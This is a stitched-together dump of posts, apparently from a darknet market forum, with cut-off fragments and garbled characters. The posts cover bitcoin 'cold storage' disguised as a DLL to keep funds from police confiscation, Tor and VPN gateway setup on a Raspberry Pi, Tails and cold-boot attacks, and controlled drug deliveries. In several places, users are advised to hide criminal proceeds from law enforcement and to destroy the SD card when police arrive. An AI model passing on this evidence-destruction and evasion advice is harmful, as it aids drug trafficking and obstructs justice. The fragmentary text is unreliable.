That SIM card should be readable but unless you can find out who the subscriber is it is of little use. Ideally you can extract the configuration from the unit which will detail the phone number of the receiving unit (these models generally send location in an SMS). Be aware that it can be re-configured remotely via SMS.  To get the configuration you should be able to connect to it via USB - it will probably appear as a serial device and has a basic menu. If you are lucky you will also be able to see the incoming SMS command messages (if any). You will also be able to see the GPS co-ordinates that it has captured and (presumably) transmitted back. These are all stored on flash.  If you are even luckier you may find that the first few location datapoints in the device belong to the 'installer' - see if you can extract them. If the co-ordinates correspond to the local sheriffs office then you know who put it there.  It could be anyone frankly - we do not recognize the casing although the format is common. It would have cost maybe 500$ +   Was it connected to your car battery or using internal Lithium batteries?   ",""

"The Hub Forums","mdparity","1040.0","2014-02-20T22:37:18","Cold Storage Method","General Discussion/Security","Howdy,  I would like to discuss an implementation of Cold Storage.  Most people believe putting the wallet/private+public keys into a USB or an offline harddrive or a piece of paper in some hidden obscure place is the best method of Cold Storage, but I completely disagree.  There are so many possibilities that could result in the loss of the Cold Storage including LE finding and confiscating your only copy (Ross Ulbricht's case and other situations as well), hardware failure, and just being forgetful and physically losing it.  I believe that the best way is to put your Cold Storage ONLINE EVERYWHERE AND EVEN ON CLOUDS.  This is an unorthodox method and some might ask, how is it cold storage if it's online everywhere.  By definition, cold storage means the wallet/keys are kept in a container that is not online nor accessible.  This means it  does not neccessarily have to be a physical offline container.  An offline container could be something as simple as an unmounted virtual drive.   Benefits of this method: - impossible to access without the required information - impossible to brute hack - accessible through many means (don't have to worry about getting locked out) - will never lose the cold storage - will not be confiscated - information can be passed easily to another person for access (ex. if you are in prison and you ask your partner to acquire the funds) - when the container is mounted, it is only loaded in memory and no trace is left when dismounted   Implementation: 1. Download TrueCrypt and create a drive container triple the size of your cold storage wallet/keys (you don't want it to be too big) 2. Create a hidden partition - for the regular partition, create a simple password you would remember 3. Hidden partition: use both password and keyfiles to encrypt (preferably 3 different complex  random files from the internet which will always be readily available) 4. After you have created the regular + hidden partition, load some random important information (bank account info, passwords, etc) into the regular partion 5. Load the wallet/keys into the hidden partition 6. Rename the created drive as something inconspicious such as sys_link.dll 7. Find a rar software package with a bunch of *.dll files and copy the renamed drive in the same folder 8. Rar the file 9. Upload it EVERYWHERE ONLINE IN CLOUDS  In order to find the cold storage, someone would need to notice the strange *.dll, find out that it is a TrueCrypt container, discover your fake important information and realize there's still a hidden container, and decrypt using your password and know the three random files you used.  Now you would have multiple layers of security as well as methods to access the funds.  The cold storage won't be confiscated because it is not on your computer.  The cold storage is not mounted, and therefore not online.  You did not keep the three files you used to encrypt the drive so it'll be difficult to figure which 3 files from the internet was used.  If you were in prison, your funds will be safe.  When you come out, you just need to download the file package, the renamed container file, the password, and which 3 random files to download to decrypt the container.  If you needed access to the funds, you can ask someone you trust and provide this information, which could be done verbally or in code words, to retrieve funds for you  (ex. to pay legal fees).  Think outside of the box.  Cheers, MDParity Founder of BlackBank",""

"The Hub Forums","axa","1040.0","2014-02-20T23:55:14","Cold Storage Method","General Discussion/Security","Interesting post, thanks for sharing. As I read your post you are recommending storing a wallet backup inside a Truecrypt container, then storing the Truecrypt container on a secure offshore server. Not a bad idea at all.   If I may add some information for consideration, both the Armory and Electrum wallets support true offline cold storage of your private keys. Both wallets allow you to split the wallet into an online 'watching only' copy of the wallet while the wallet with your private keys is stored on an offline computer.  The online 'watching only' wallet can receive bitcoin routinely, but if you want to send bitcoin you need to 1) create an unsigned transaction using the online wallet 2) using a USB drive take the unsigned transaction file to the offline wallet and sign it then 3) take the signed transaction file back to your online computer and broadcast it online.   Both Armory and Electrum allow you to export a digital backup of your offline wallet with your private keys. It is a simple matter to make a Truecrypt container with a strong password in which to store your digital backup. Since both Armory and Electrum are deterministic wallets only one backup is only needed, ever. Then just find long term secure storage offshore and upload the Truecrypt container and you are good to go.   Using this method of cold storage your bitcoin can not be stolen because your private keys are on your offline computer (which must be encrypted with FDE) with a digital copy kept securely encrypted with Truecrypt at the storage location of your choice. And you can still send and receive bitcoin using your online and offline computers. ",""

","Quote from: Crow_of_Old on March 07, 2015, 09:31:34 pmPurchase two microSDs from a retailer, put the encrypted OS on one (sda), /boot on the other (sdb). Keep sda in the main machine. Keep sdb away from the machine, say, in one's wallet. Before booting off of sdb, checksum it from a different machine, such as a teensy++ hooked up to a card reader. Also, avoid checksumming using md5. Is this a bad method for keeping /boot secure? Aside from keyloggers inside of the main machine, obviously.that would work. a few downsides: if either microSD fails, you are completely hosed. and the first time you use apt-get/yum/pacman/* to apply updates to anything that live in /boot, you will need to remount sdb writable, update your checksums, etcseems like a huge pain, but most anti-evil-maid options are.this is one area where things like tails/alpine/etc are helpful because the os image can be verified or even written to RO media.wish there was a cheap & easy USB forensic write-blocker available, that would give everyone some interesting options"

This means only 4GB of memory is addressable by either. If a user has more than 4 GB on his computer, is there any guarantee that all physical memory will be cleaned on shutdown (Tails)?   CPU's since the 90s have been shipping with PAE https://en.wikipedia.org/wiki/Physical_Address_Extension which allows them to access more than 4GB even if the OS is 32-bit.  My impression is that encryption keys will often be kept in a cache close to the CPU due to its frequency of use. Thats alright. My doubt is about the mapping between physical and translated addresses when the OS is 32 bit but machine is 64-bit and physical RAM is much bigger (say 1.5x 4GB or more). Is some behind the scenes caching possible in multi-core/multi-cpu architectures that remains transparent to the kernel?

You know, there was a fascinating presentation at defcon a little while back where this one presenter (who's name escapes me) thinks we need to overhaul whole disk encryption. His idea was to never have the encryption keys stored in RAM, but to use the debug registers in the CPU to store the keys. That way, if you also used the AES-NI instruction set to do all your encryption/decryption, then your sensitive information exists only inside the processor, and never in your RAM. If your keys never leave your processor, it's IMPOSSIBLE to cold boot attack that. Potentially, you might even be able to have encrypted RAM with this approach as well.  Personally, I think this would require some more engineering on the part of the chip designers. Maybe Intel or AMD could integrate crypto registers into their CPUs that would never be used in the normal course of operations, and who's only purpose would be to store encryption keys for the operating systems and other programs that needed it. Intel has shown an interest in including security features on their chips in the past, and have been putting random number generators on their CPUs since the Pentium III (the current one is RDRAND and is available in their i5 and i7 models).  Anyway, sorry to hijack this thread, but there is definitely a need to integrade hardware design to make whole disk encryption more secure.",""
"The Hub Forums","pinkelephant1","6146.0","2015-01-06T22:02:33","Tails/Whonix 32-bit address space and cold boot attacks","Start Here/For Beginners"," The point of using registers inside the processor instead of RAM to store encryption keys is that there is no way to read the contents of memory inside the processor. You can create a RAM dump file by plugging a device into the PCI port, etc... . There is no way to do this for information stored in CPU registers, which means no cold boot attack is possible. This would make the crypto operations faster anyway, since you don't need to do any memory read operations.  The issue of NSA approved backdoors in the CPU is a valid concern, just Google RDRAND random number generator instruction and see all the debate about a possible backdoor (based on my testing, I don't personally believe RDRAND is backdoored, but whatever, it's worth considering before relying on it exclusively).  But if your CPU is backdoored, then the security of your cryptography is the least of your concerns, since the CPU can essentially do whatever it wants on your system. I'm slightly more inclined to trust chip manufacturers considering that we have absolutely no choice but to do so until open source hardware that you can program into an FPGA becomes more common.  Also, consider the Snowden leaks, nothing about the NSA being able to break cryptography because of hardware backdoors in your CPU has ever come out. In fact, we've seen the opposite: that properly implemented cryptography work very very well in keeping them at bay.","That is interesting. I'll have to check it out.

Lelantos has had numerous complaints from people over on Agora; caveat emptor. Torbox has an 8-character password maximum -- I consider that absolutely laughable these days. ZaphodOk, I bite. Whatâs wrong with a DN website having TOR ads on it? We are putting TOR ads on the CCC website http://cocaineweogeta6y.onion to help pay for the expenses of running the website. At the Kingdom forum they have a TOR ad at the bottom of their page. We do run a little blurb that we are not affiliated with TOR ads, nor those entities being advertised and to use caution."

In both cases you have to set up your webserver first and install the components you need (apache, sql etc). You will arrive at a point where you can view the default website of your web service when you open your servers IP in a browser. Now you need to install Tor on the server and add/uncomment this line to your torrc:  HiddenServiceDir /var/lib/tor/hidden/ HiddenServicePort 80 127.0.0.1:80  Now run Tor. You will find a randomly generated Onion hostname and its private key in the specified folder. If you enter the onion url in Tor Browser, you should see your webservice again.  You can now change your webserver config to only accept connections from localhost, so your service is only reachable through Tor.  The Bitcoin payment thing is something different and has nothing to do with Tor at this point. Either you program your own Bitcoin handling software using the many free available libraries, or you use complete CMS solutions like joomla, drupal, wordpress.. They all have commerce addons and probably most of them have a bitcoin payment gateway. Also there is Bitwasp, a webshop solution with a bitcoin processor already integrated.   There is nothing wrong in setting up hidden servers, people should do it more often and push the development. Not every hidden service serves the purpose of hosting a drug empire. If you DO plan to run a drug empire, your personal terrorist network or a human trafficing consultancy though, then there are obviously a lot more details and opsec to consider and probably not recommendable to OP who is ""completely green"" in the first place","Don't do it!"

What if you could route Tor -> VPN wouldn't that be like,  anonymity^2 or somefink? That way you could log in to Facebook without anybody knowing it was you. But it'd really only work with a reputable VPN service that pinkie swears not to sell you out, something like Hide My Ass.  LOL just yanking yer crank       So I've recently moved to using TAILS and it's NOT PLAYING NICE AT ALL with my Claws Mail client, along with others. I can receive e-mails, however, whenever I attempt to send I get the error: Client host [x.x.x.x] blocked using zen.spamhaus.org  Obviously, the mails servers don't wanna play ball. I've been banging my head with this problem for the past few days and have tried:  - Tor > OpenVPN (can connect to the server, but an unable to route traffic through it) - Running Claws through a SSH tunnel (outright fail -- even though it works with the browser) - Using my VPN's private Tor exit nodes (SSL authentication error)  Previously, I was using a Raspberry Pi transparent proxy/anonymizing middlebox a la the Onion Pi and OpenVPN worked fine -- no problems there. However, the TAILS os seems to be a different beast entirely, and seems to derive some perverse satisfaction in fucking with my shit.  I have spent a lot of time searching and it seems that nobody can offer an explanation on how to configure a VPN for TAILS specifically.  So my question is: does anyone out there know how to configure TAILS appropriately for what I'm trying to do? Ideally Tor > OpenVPN, but right now I'll take anything I can get. I have the strong feeling that the Polipo settings are behind all of this, but I haven't quite worked out how.   I'm now at the end of my tether, and would be willing to gift a token sum to anybody who can offer a working solution to this.  Jah Bless      ",""

So, here I have a suggestion in regards to alternative method for your theory.  1.tunnel all of your OS application traffic through tor. (universal) 2.Install and use second browser (example: opera or whichever you like, the one with socks proxy option) 3.find a good socks proxy and apply to that second browser. 4.check your IP, it will be showing your socks IP.  technically it's like this Tor > Socks Proxy > facebook which is similar to Dynamic > Static > facebook  So here, neither socks provider nor facebook will get to know who you really are.  and about your mails server stuffs, I am not sure why you wanna do that! (however, hope you got some new ideas on mind how to, if you want to) I think you are trying to collide real identity with tor world ? I quiet did not understand the purpose.",""

This guide will help you create a small portable physical firewall to encrypt all outgoing traffic.  What you need:  Hardware  0. $35 Raspberry Pi model B/B+. The Raspberry Pi is a low cost low powered computer.  1. $30 Two wifi cards: at least one capable of packet injection/compatible with hostapd.  2. $10 SD card with r/w speed of at least 20MB/s.  3. HDMI Monitor, USB keyboard.  4. Mechanism to transfer disk image to SD card.  Software (all open source)  0. Raspbian Operating System: http://www.raspbian.org  1. cryptsetup: to encrypt your SD card running Rasbian  2. openvpn: VPN client  3. tor: software developed by The Government of The United States of America for online anonymity and free speech  4. hostapd: to create a WiFi Access Point (AP)  5. isc-dhcp-server: to give out IP addresses to clients of AP via DHCP  What you get: The FreedomPi!  An encrypted raspberry pi access point which routes internet traffic through VPN and then Tor          [USER's Computer] -> [encrypted raspberry pi] -> (VPN) -> {Tor} -> |Website|  ###############################################################################  Preparation: installing raspbian and then encrypting it for security  ###############################################################################   1. Download an image file of raspbian such as the official image from raspbian.org or one of the tiny off shoots (minibian or DietPi).  2. You can write this image to your SD card using *win32diskimager* in windows, or dd in linux/os-x  3. Plug this SD card in your raspberry pi. At first boot, login, connect to the internet and run          sudo apt-get update  4. If the above command ran successfully it will download debian package information from repository. Next run          sudo apt-get install cryptsetup initramfs-tools     to install *cryptsetup* and *initramfs-tools* to unlock the encrypted partition we will create.  5. Create a file in */etc/initramfs-tools/hooks* that reads:              #!/bin/sh              PREREQ=""""              prereqs()             {                echo ""$PREREQ""             }              case $1 in             # get pre-requisites             prereqs)                prereqs                exit 0                ;;             esac             . /usr/share/initramfs-tools/hook-functions             copy_exec /sbin/cryptsetup /sbin             copy_modules_dir kernel/crypto             manual_add_modules dm-crypt             manual_add_modules dm-mod  6. Run          sudo mkinitramfs -o /boot/initramfs.gz    to create the ramdisk with support for encryption modules  7. Open */boot/config.txt* in vim/nano and add the following line at the end:          initramfs initramfs.gz followkernel  8. Imagine you want to call your encrypted SD card SKUL. Edit */boot/cmdline.txt* to modify rootfs device and add cryptdevice:          root=/dev/mapper/SKUL cryptdevice=/dev/mmcblk0p2:SKUL  9. Shutdown the raspberry pi          sudo shutdown -Ph now  and unplug the SD card. Bring it to a linux computer where it can be encrypted. If not, you can get another SD card to boot a clean copy of raspbian, and plug the old SD card using a USB reader in a spare slot on the raspberry pi. Principle is the same.  (((On a second computer running Linux)))  10. Lets say your SD card (the one we're preparing) is called */dev/mmcblk0* when plugged into linux. Then, if you followed this tutorial, you'll see */dev/mmcblk0p2* which is the root partition. Mount this somewhere and back it up.          sudo mount /dev/mmcblk0p2 /media         sudo cp -Rp /media/* ~/backup         sudo umount /media  11. Encrypt */dev/mmcblk0p2* and backup luks headers          sudo cryptsetup --verbose -c aes-cbc-essiv:sha256 --verify-passphrase --key-size 256 luksFormat /dev/mmcblk0p2      You will be asked for the passphrase. Choose something at least 20 characters long.          sudo cryptsetup luksHeaderBackup --header-backup-file ./freedom-pi /dev/mmcblk0p2  12. Map the encrypted partition and format it:          sudo cryptsetup luksOpen /dev/mmcblk0p2 SKUL         sudo mkfs.ext4 /dev/mapper/SKUL  14. Mount it and copy over the rootfs          sudo mount /dev/mapper/SKUL /media         sudo cp -Rp ~/backup/* /media  15. With the SD card still mounted change */media/etc/fstab* to indicate root partition will be mounted from SKUL          /dev/mapper/SKUL     /     ext4    defaults,noatime     0     1  16. Edit */media/etc/crypttab* to add information about your encrypted rootfs:          # <target name> <source device>         <key file>      <options>         SKUL    /dev/mmcblk0p2                  none            luks  17. Unmount          sudo umount /media  ((( Back to the raspberry pi )))  18. Plug the SD card in, power on the Pi, connect to monitor and watch it boot. If you followed all steps correctly you will see it get stuck at a prompt because it cannot find the SKUL drive. To unlock, run the following:          sudo cryptsetup luksOpen /dev/mmcblk0p2 SKUL      Enter your passphrase when prompted and then type ""exit""  19. The Pi would begin to boot. Once you are in, all necessary modules are loaded, crypt devices are recognized, and you can recreate the final initramfs to set it up:          sudo mkinitramfs -o /boot/initramfs.gz  20. Reboot the pi and this time you'll get a boot prompt which asks for your password to auto mount your encrypted rootfs  ###############################################################################  Setting up hostapd  ###############################################################################  This is fairly simple. Only complexity arises in identifying whether your wifi card will work with hostapd drivers or not.  1. With your raspberry pi connected to the internet, install *hostapd* and *isc-dhcp-server*                  sudo apt-get install hostapd isc-dhcp-server    (If isc-dhcp-server fails, don't worry. Its a configuration issue)  2. Edit */etc/default/hostapd* to add the following lines:          DAEMON_CONF=""/etc/hostapd/hostapd.conf""         RUN_DAEMON=yes  3. Edit */etc/hostapd/hostapd.conf* according to your card. There are several tutorials online on this. In my case, assuming a typical card:          interface=wlan0         driver=nl80211         ssid=MyWiFi         channel=1         hw_mode=g         wme_enabled=1         ieee80211n=1         macaddr_acl=0         auth_algs=1         ignore_broadcast_ssid=0         wpa=2         wpa_passphrase=MyPassWord         wpa_key_mgmt=WPA-PSK         wpa_pairwise=TKIP         rsn_pairwise=CCMP  4. Setup isc-dhcp-server: edit the file */etc/dhcp/dhcpd.conf* and add:          DHCPDARGS=""wlan0"";         ddns-update-style none;         default-lease-time 600;         max-lease-time 7200;         authoritative;         log-facility local7;         subnet 192.168.1.0 netmask 255.255.255.0 {                     range 192.168.1.100 192.168.1.200;                     option subnet-mask 255.255.255.0;                     option domain-name ""localdomain"";                     option domain-name-servers 192.168.1.1;                     option broadcast-address 192.168.1.255;                     option routers 192.168.1.1;                 }  5. Edit */etc/default/isc-dhcp-server* to add:          INTERFACES=""wlan0""  6. Configure *wlan0* for test run:          sudo ifconfig wlan0 inet 192.168.1.1 netmask 255.255.255.0  7. Fire off *hostapd* and *isc-dhcp-server*, it should run without any problems          sudo /etc/init.d/isc-dhcp-server restart         sudo /etc/init.d/hostapd  restart  8. On another computer check to see if your access point (MyWiFi) is visible. Try connecting and see if you get an IP address via DHCP  9. Set it up so *hostapd* always runs: edit */etc/network/interfaces* to say:          auto wlan0         iface wlan0 inet static         address 192.168.1.1         netmask 255.255.255.0  10. Reboot and verify that after booting the pi with encrypted root you can see the access point and you can connect to it. From another computer try          ssh 192.168.1.1   and verify that ssh works.  ###############################################################################  Packet forwarding  ###############################################################################  For this bit we assume you have another wifi card which we call *wlan1* (replace with *eth0* where appropriate). The idea is, *wlan1* is connected to an external access point which goes to the internet, and you connect to *wlan0*. So we want to link up the devices as:          Laptop -> [wlan0 -> wlan1] -> ExternalAP -> {Internet}  This way the outside world only sees ExternalAP or at most *wlan1*, but not your laptop, and all traffic emerging from *wlan1* is encrypted by VPN/Tor.  1. Enable packet forwarding. Edit */etc/sysctl.conf* to uncommented this line:          net.ipv4.ip_forward=1     Load it by running          sudo sysctl -p  2. Setup iptable rules. Edit */etc/network/interfaces* to add:          auto wlan1         allow-hotplug wlan1         iface wlan1 inet dhcp         wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf #config for connecting wlan1 to external AP         up /sbin/iptables -F         up /sbin/iptables -X         up /sbin/iptables -t nat -F         up /sbin/iptables -A FORWARD -o wlan1 -i wlan0 -s 192.168.1.0/24 -m conntrack --ctstate NEW -j ACCEPT         up /sbin/iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT         up /sbin/iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE         up /sbin/iptables -A FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu -t mangle  3. Plug in *wlan1* and bring it up by:          sudo ifup --force wlan1  4. Verify that *wlan1* connected.  5. On another computer, try connecting to **MyWiFi** and verify that you can browse the internet through it.  6. At this point the Pi is a non-tor Access Point which acts as a wifi extender. Now we enable Tor on this AP.  ###############################################################################  Configuring TOR  ###############################################################################  1. Install *tor* packages:          sudo apt-get install tor tor-arm obfsproxy  2. Edit */etc/tor/torrc* to say the following:          #Nickname JenniferLopez #optional identifier if you run a relay         LongLivedPorts 21,22,80,443,706,1863,5050,5190,5222,5223,6523,6667,6697,8080,8300,9001,9030         ExcludeNodes {us} #example do not connect to any american node          NumEntryGuards 8         UseNTorHandshake 1         AvoidDiskWrites 1          VirtualAddrNetworkIPv4 10.192.0.0/10         AutomapHostsSuffixes .onion,.exit         AutomapHostsOnResolve 1         DNSPort 5353  #TorDNS to prevent DNS Leaks         DNSListenAddress 192.168.1.1 #only listen on wlan0          ExcludeSingleHopRelays 1         AllowSingleHopCircuits 0         EnforceDistinctSubnets 1          DisableDebuggerAttachment 0          ControlListenAddress 127.0.0.1         ControlPort 9051          Sandbox 1         ClientOnly 1         SocksPort 127.0.0.1:9050 IsolateDestAddr IsolateDestPort         SocksPort 127.0.0.1:9061 IsolateDestAddr         SocksPort 127.0.0.1:9062 IsolateDestAddr IsolateDestPort         SocksPort 127.0.0.1:9150          TransListenAddress 192.168.1.1         TransPort 9040         WarnUnsafeSocks 1  3. Edit */etc/network/interfaces* to enforce Tor traffic by adding the following lines:          up /etc/init.d/tor restart         up /sbin/iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 22 -j REDIRECT --to-ports 22         up /sbin/iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j REDIRECT --to-ports 5353         up /sbin/iptables -t nat -A PREROUTING -i wlan0 -p tcp --syn -j REDIRECT --to-ports 9040  4. Reboot your raspberry pi (to verify that hostapd+isc-dhcp-server+tor are working)  5. Connect to **MyWiFi** and check if you can browse the net. Verify Tor enforcement by visiting https://check.torproject.org/, Proxy Judge, and http://www.proxytester.org to check for DNS Leaks. Even with JavaScript and Flash on, *you should not be seeing the DNS servers of your ISP*.  ###############################################################################  OpenVPN and VPNGate  ###############################################################################  1. Install openvpn:          apt-get install openvpn  2. Find a free VPN Server you like by visiting http://www.vpngate.net and select OpenVPN  3. Download the TCP ovpn file for your favorite VPN. Make a directory */etc/openvpn/vpngate* to save the config file.  4. Create a file *user.txt* in */etc/openvpn/vpngate* with just two lines:          vpn         vpn  5. Edit the file you just downloaded from vpngate to add the line:          auth-user-pass user.txt  6. Now run openvpn and verify that it works:          sudo /usr/sbin/openvpn --config /etc/openvpn/vpngate/YOUR_OVPN_FILE --cd /etc/openvpn/vpngate  7. If all goes well, you'll see the handshake and authorization (if not, go back to step 3). *Ctrl-C* to break out and now run as a daemon:          sudo /usr/sbin/openvpn --daemon --config /etc/openvpn/vpngate/YOUR_OVPN_FILE --cd /etc/openvpn/vpngate  8. Run ifconfig and dmesg and look for a device called tun0. This means openvpn is running. Restart tor:          /etc/init.d/tor restart  9. Run tor-arm:          sudo -u debian-tor arm     It takes a bit to start up, press the right arrow key when its ready and in a tab you'll see the outgoing connections. Check that your IP address is nowhere on the list (Entry node should be the VPN's IP address)  10. Create a script called */etc/network/startvpn* to randomly pick a vpngate VPN for you:          #!/bin/bash         files=(/etc/openvpn/vpngate/*.ovpn)         /usr/sbin/openvpn --daemon --config ${files[RANDOM % ${#files[@]}]} --cd /etc/openvpn/vpngate  11. Edit your */etc/network/interfaces* file before the line about tor restart to connect to VPN automatically when wlan1 is connected:          up bash /etc/network/startvpn  ###############################################################################  Other enhancements  ###############################################################################  VPNGate publishes a CSV file which you can parse to automatically extract relevant VPN configurations.          torsocks wget ""http://www.vpngate.net/api/iphone/"" -O vpngate.csv  The last string in each line (15th string) is a base64 encoded config file. It can be extracted by:          echo $15 | tr -d '\n\r'  |  base64 -d  You can thereby automatically populate */etc/openvpn/vpngate* for yourself each time you go online.  Defeat Deep Packet Inspection: Upon exiting VPNGate, Tor traffic can be obfuscated through obfsproxy.  Download Tor source code and edit *src/or/or.h* to increase the route length from 3:          #define DEFAULT_ROUTE_LEN 3  ###############################################################################  End State  ###############################################################################  In the end we have the following configuration:          Laptop/Computer -> (FreedomPi -> VPN -> TOR) -> Website  This way your TOR entry node is already out of your ISP's control. By tweaking torrc you can control where you want to end up.  A different setup can be when you run OpenVPN on your laptop while keeping the raspberry pi intact:          Laptop/Computer -> (FreedomPi -> VPN1 -> TOR) -> VPN2 -> Website  In this setting, VPN2 will not know where you are connecting from. You can add another layer of confusion by running TOR and OpenVPN on your own laptop while connected to the Pi.          Laptop/Computer -> (FreedomPi -> VPN1 -> TOR) -> VPN2 -> TOR -> Website  ###############################################################################  Final words  ###############################################################################  You will notice lower throughput in internet traffic because your packets go through VPN, and then through TOR. Meanwhile the Raspberry Pi is doing some heavy number crunching in the background with encryption and decryption. If needed you can get a more powerful device such as a HummingBoard or Odroid. In comparison to newer and more powerful devices the Pi has the advantage of a stable operating system and larger community. It also comes with a *built in hardware random number generator*. A Pi, being small and cheap can easily be hidden somewhere, and if needed can be easily disposed of.  A decent project for hardware hackers would be to leverage the GPU for some AES/XTS computations. GPU libraries are present in */opt/vc*  A MicroSD can be easily broken and disposed, and encryption provides another layer of security. If someone knocks on your door, pull out the SD card and flush it down the toilet, or put it in the stove, or throw it out the window. With a sufficiently large SD card (32-64GB), you can have two layers of encryption with truecrypt (tcplay). Keep all data encrypted on the SD card, and take precautions to harden the Pi from outside attacks. This way you can leave your laptop clean, no need to raise suspicions by installing tor or openvpn on your laptop. If someone comes by and confiscates your laptop, let it be. All they will find is a suspicious looking Wireless Access Point called ""MyWiFi""!  Some steps in this article are risky because they reveal your download of cryptographic software. Hopefully someone will eventually release a small image that comes pre-installed and configured to run out of box.  Most VPN Gate servers store connection logs for 2 weeks. Tor routes through 3 fastest nodes it can find online (entry+relay+exit). It is known that some nodes are malicious. Extra nodes can be added by compiling the Tor source code for greater anonymity but it also increases your chances of running into subversive nodes. Running large downloads can enable a hacker to locate your real IP address which is where VPN can help a bit, but remember a proxy alone cannot hide your real identity. The FreedomPi is just a start.  Lastly, in the spirit of freedom and liberty, I request everyone reading this to donate a few hours of your computer time to run Tor relay nodes and VPNGate Servers to help those citizens and patriots who cannot go online without being spied upon by their own employees. (The best part of running a Tor relay? You can give it crazy nickname like **""FreeSpeech4Taxation""** visible to anyone connecting to it!)  ###############################################################################  References and Reading material  ###############################################################################  [1] Using an Encrypted Root Partition with Raspbian http://paxswill.com/blog/2013/11/04/encrypted-raspberry-pi/  [2] Adafruit Onion Pi  https://learn.adafruit.com/onion-pi?view=all  [3] Wireless Chipset Table https://wikidevi.com/wiki/Wireless_adapters/Chipset_table  [4] Raspberry Pi Random Number Generator https://vk5tu.livejournal.com/43059.html  [5] Linux-Debian-7-Admin https://github.com/lukeluo/linux-debian7-admin/tree/master/home/luke/vpngate  [6] Replacing Truecrypt  http://jasonwryan.com/blog/2013/01/10/truecrypt/  [7] Attacks on Tor  https://blog.torproject.org/category/tags/attacks  [8] Almost everyone involved in developing Tor was (or is) funded by the US government http://pando.com/2014/07/16/tor-spooks/  Originally posted on: https://www.reddit.com/r/LifeProTips/comments/2pel21/to_confuse_and_protect_bypass_government/ ",""

Would you care to back this claim up?   From: https://trac.torproject.org/projects/tor/wiki/doc/TorifyHOWTO       If you know a way to do this, then please share. I have probably spent >20 hours researching ways to establish an OpenVPN connection in TAILS but to no avail. As far as I'm aware it simply is not supported without  significant modifications to its underlying configuration.  Moreover, the developers don't recommend it either -- and suggest using SSH to access a proxy instead. (Can no longer find it on TAILS website -- I think they've since pulled that specific post).   ","Running Tor over Tor is safe. ;When using a transparent proxy, it is possible to start a Tor session from the client as well as from the transparent proxy, creating a ""Tor over Tor"" scenario. Doing so produces undefined and potentially unsafe behavior. In theory, however, you can get six hops instead of three, but it is not guaranteed that you'll get three different hops - you could end up with the same hops, maybe in reverse or mixed order. It is not clear if this is safe. It has never been discussed. For safety of information, it is necessary to make backups on DLT tapes f.e. and secure these tapes into a Ã¢â¬â¹fire proof safe Ã¢â¬â¹infosafe for data certified 2 hours.You can Ã¢â¬â¹choose an entry/exit point, but you get the best security that Tor can provide when you leave the route selection to Tor; overriding the entry / exit nodes can mess up your anonymity in ways we don't understand. Therefore Tor over Tor usage is highly discouraged.;All of this can be avoided if you can manage to connect to a VPN with Tails."
"The Hub Forums","NI","6092.0","2014-12-19T02:17:10","Make your own TOR Gateway with the Raspberry Pi","Start Here/For Beginners","This is a decent setup, however, the Tor machine is persistent and no disabling of logs has been mentioned.  The log issue could be rectified by symlinking the log directories to /dev/null, and the persistence problem may not be possible to overcome on a Raspberry Pi due to its low amount of RAM (last I checked anyway).  If you are using a more powerful machine for your home anonymity gateway, Tor Ramdisk (http://opensource.dyc.edu/tor-ramdisk) is a very useful tool.  The entire OS is held in RAM, so everything is lost after shutdown.  The only failpoint there is a cold boot attack or improperly configured iptables or other networking.  Also, if this setup is being run over WiFI, the basic use of iptables to forward requests to the gateway is only as secure as your WiFi, which is not at all unless you are using WPA2 Enterprise with WPS disabled.  A more secure solution would be to SSH tunnel the remote Tor SOCKS connection to the local machine and then configure network applications (like your browser) and iptables as with a normal Tor configuration.  Another point of failure is the use of a third party VPN server.  There is no way to know if that server keeps logs.  The fix for this would be to rent a cheap VPS (preferably outside your home country and not in North America), install OpenVPN and either disable logs in its configuration or symlink the log directory to /dev/null.",""

If LE were to be doing the vending directly, do you really believe that any CD's they prepare will ACTUALLY enter the mail system? Buy postage for it, track it, hand it to a non-LE postal worker and wait for it to be delivered?  No. They will make it appear as such, but it will never enter mail circulation. Especially if it has drugs in it. You might even be able to track it, but rest assured that no mail carriers will ever see or handle it. Only LE. That's not mail, that's a sting operation in a box.  In any event, the other conditions listed in the original post you quoted would still need to be met for any LE vendor to have a fruitful CD on a suspected buyer.","Quote from: Praetorian on June 21, 2014, 03:00:43 am2.) You will have to accept delivery of a package that you know contains drugs. That would be exceedingly diffcult for them to make happen since they can't actually send you a box of drugs in the mail, and if it's empty, you arguably haven't done anything illegal.Why can't they send you a box of drugs in the mail?  I'll qualify in the US, as was noted, regional differences may apply, but in the US, they not only can send you a box of drugs, they've done it.  What do you think ""controlled deliveries"" are?  It's not that hard for them to box up some of what they have for undercover ops, particularly if an order's been placed for it to that address, and they can demonstrate that."

With respect to the warrant canary, I regard this as more of a marketing gimmick than anything else. The reason I say that is that RuggedInbox's warrant canary statement reads: ""The FBI has not been here"" (Watch very closely for the removal of this sign.)   Given that the service is ostensibly hosted on a VPS located in Bulgaria, I think it far more likely that they would receive a visit from their local authorities, than from the FBI, and I don't think their warrant canary would warn you about that.  One of their unique offering is temporary email accounts, which can be set to self-destruct after a user selectable time frame, ranging between 1 hour and 1 year. The service is Tor-friendly, requiring no Javascript -- they do not use RoundCube, but rather the more secure SquirrelMail.   Personally, I'd recommend them -- they seem to have their heads screwed-on straight.   Zaphod   ","I found this cool site.

According to FBI spokesperson David Berman, the 400 URLs only amount to a dozen or so sites. âThere are many URLâs to particular sites,â he said. âWeâre still going through the results of the operation.â   Zaphod ","Bulgaria VPS hosting isnt that what SR2 used?; ... While Berman mentioned a dozen sites, a complaint filed in the New York Southern District of New York on Friday confirms that at least 27 sites were seized during Operation Onymous, including the Silk Road 2.0. The complaint was issued by the United States âseeking the forfeiture of any and all assets of the following dark market websites operating on the Tor network.â The FBI refused to comment on how many other sites were seized outside the ones listed on the complaint.The complaint divides the 27 websites into various, sometimes overlapping categories, while noting that all the sites âoffer for sale illicit goods and services of one kind or another.âThe first category in the federal complaint is sites selling illegal narcotics. The complaint gives the example of âCloud Nineâ which had â1G Pure Uncut Fishscale Cocaineâ for sale by âMrs. Blancoâ for 0.2934 Bitcoin. The narcotics sites are:    Alpaca    Black Market    Blue Sky    Bungee 54    Cabbabis UK    Cloud Nine    Dedope     Farmer1    Hydra    Pablo Escobar Drugstore    Pandora    Silk Road 2.0    Smokeables    Tor BazaarOther seized sites sold stolen and counterfeit credit cards. âFake Real Plastic,â for example, sold cards 